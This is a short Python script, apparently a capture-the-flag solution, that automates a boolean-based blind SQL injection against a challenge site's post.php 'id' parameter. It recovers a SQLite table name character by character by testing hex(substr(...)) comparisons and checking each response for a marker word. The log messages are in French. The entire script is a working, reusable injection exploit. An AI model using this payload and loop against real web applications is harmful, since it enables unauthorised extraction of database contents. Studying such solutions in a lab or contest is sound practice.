#!/usr/bin/env python3

import pwn
import string
import requests

table_name = ""
alphabet = string.printable[:-6]
url = "https://secureblog.challenge.operation-kernel.fr/v2/post.php"
seek = True
pwn.log.progress("Can i found it ?")
while seek:
    for car in alphabet:
        req = {
            "id": "1 and (SELECT hex(substr(tbl_name,{},1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('{}')".format(
                len(table_name) + 1, car
            )
        }

        x = requests.post(url, data=req)
        r = x.text
        print(r)

        #r = requests.post(url + "&id=" + response)
        if str("Truiteur") in r:
            table_name += car
            pwn.warn(
                "Le caractère {} est le bon, il est ajouté à table_name : {}".format(
                    car, table_name
                )
            )
            break
        if car == str("~"):
            pwn.success("Le nom de la table est : {}".format(table_name))
            seek = False
        else:
            continue
